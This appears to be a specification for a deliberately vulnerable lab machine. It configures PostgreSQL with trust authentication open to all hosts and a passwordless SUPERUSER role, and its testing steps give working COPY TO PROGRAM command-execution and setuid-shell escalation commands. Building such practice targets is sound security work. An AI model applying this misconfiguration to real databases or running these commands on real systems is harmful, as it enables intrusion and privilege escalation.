---
id: postgres_rce
description: Configures PostgreSQL with pg_hba.conf set to trust authentication and grants SUPERUSER to a low-privilege database user, enabling Remote Code Execution via the COPY ... TO PROGRAM SQL command.
required_vars: [db_user]
requires_service: postgres
---
# Atom: PostgreSQL RCE via COPY TO PROGRAM
PostgreSQL's `COPY ... TO PROGRAM` feature executes an OS command as the `postgres` system user. When a database user has `SUPERUSER` privileges and authentication is set to `trust` (no password required), any user who can connect to the database can achieve OS-level code execution.

> **PostgreSQL is provided by the platform.** The `postgres` service recipe (declared via `requires_service`) installs the correct package for the target distro, starts the cluster, and sets `listen_addresses = '*'` so it is reachable over the network. The entity script MUST NOT install or start PostgreSQL. It applies only the vulnerability: `trust` authentication and a `SUPERUSER` role. Run `psql` as the `postgres` system user over the local socket (peer auth), which works regardless of `pg_hba.conf`.

### Logic Requirements:
1. Set `pg_hba.conf` to `trust` authentication for local and host connections (version-agnostic path via `find`):
   ```
   local   all   all             trust
   host    all   all   0.0.0.0/0 trust
   ```
2. Create `<db_user>` with SUPERUSER: `CREATE USER <db_user> WITH SUPERUSER;`
3. Reload PostgreSQL so the new `pg_hba.conf` takes effect (a `trust` change needs only a reload, not a restart — `listen_addresses` is already set by the recipe). Use `SELECT pg_reload_conf();` or the Debian cluster reload, not a distro init system.

### Common Patterns:
- **Apply the misconfiguration (service already running):**
  ```bash
  # trust auth for everyone
  PG_HBA=$(find /etc/postgresql -name pg_hba.conf 2>/dev/null | head -1)
  cat > "$PG_HBA" << 'EOF'
  local   all   all             trust
  host    all   all   0.0.0.0/0 trust
  EOF

  # superuser role + a database it owns, created over the local socket as postgres
  su -c "psql -c \"CREATE USER <db_user> WITH SUPERUSER;\"" postgres
  su -c "psql -c \"CREATE DATABASE <db_user> OWNER <db_user>;\"" postgres

  # reload so trust auth takes effect
  su -c "psql -c \"SELECT pg_reload_conf();\"" postgres
  ```

### Testing Guidance:
1. Verify PostgreSQL is listening on 0.0.0.0: `ss -tlnp | grep 5432`
2. Connect without a password: `psql -U <db_user> -h 127.0.0.1 -c 'SELECT current_user, pg_is_in_recovery();'`
3. Verify SUPERUSER privilege: `psql -U <db_user> -h 127.0.0.1 -c '\du'` — `<db_user>` should show `Superuser` attribute.
4. Test RCE via COPY TO PROGRAM:
   ```sql
   psql -U <db_user> -h 127.0.0.1 -c "COPY (SELECT '') TO PROGRAM 'id > /tmp/rce_proof.txt'"
   cat /tmp/rce_proof.txt
   ```
   Output should contain `uid=` confirming OS command execution.
5. Escalate: `COPY (SELECT '') TO PROGRAM 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'`

### Synthesis Guidance:
PostgreSQL install/start/`listen_addresses` is owned by the `postgres` recipe — the entity must not duplicate it. The atom applies only `trust` auth + a `SUPERUSER` role. Use shell globbing (`find /etc/postgresql -name pg_hba.conf | head -1`) to avoid hardcoding the version. Create the superuser over the local socket as the `postgres` system user (peer auth), so it works before `trust` is reloaded. Note: `COPY TO PROGRAM` requires PostgreSQL >= 9.3.
